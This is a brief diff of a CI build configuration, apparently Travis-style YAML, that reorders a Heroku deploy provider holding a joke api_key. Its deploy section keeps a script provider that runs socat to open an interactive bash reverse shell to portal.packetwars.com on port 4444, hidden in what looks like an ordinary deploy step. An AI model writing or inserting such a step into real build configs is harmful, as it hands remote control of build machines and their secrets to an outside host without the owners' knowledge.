@@ -16,7 +16,7 @@ script:
     - echo "is this script?"
 
 deploy:
-    - provider: heroku
-      api_key: "no, this is deploy."
     - provider: script
       script: /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:portal.packetwars.com:4444
+    - provider: heroku
+      api_key: "no, this is deploy."
